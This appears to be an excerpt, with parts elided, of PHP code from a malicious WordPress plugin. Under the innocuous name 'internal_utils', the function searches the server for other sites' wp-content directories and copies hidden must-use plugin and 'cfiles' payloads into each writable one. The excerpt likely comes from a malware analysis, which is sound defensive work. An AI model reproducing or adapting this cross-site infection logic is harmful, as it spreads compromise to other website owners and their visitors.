...
function internal_utils()
{
	...
	$sourceDir1 = plugin_dir_path(__FILE__) . '/core/utils/data/mu-plugins';
	$sourceDir2 = plugin_dir_path(__FILE__) . '/core/utils/data/cfiles';
	...
	foreach ($iterator as $spl) {
		if ($spl->isDir() && strtolower($spl->getFilename()) === 'wp-content') {
			...
			if (file_exists($spl->getPathname() . DIRECTORY_SEPARATOR . 'mu-plugins' . DIRECTORY_SEPARATOR . 'init.php')) {
				continue;
			}
			...
			$targetDir = $spl->getPathname() . DIRECTORY_SEPARATOR . 'cfiles';
			if (!is_writable($spl->getPathname())) {
				continue;
			}
			copyDir($sourceDir2, $targetDir);
		}
	}
}
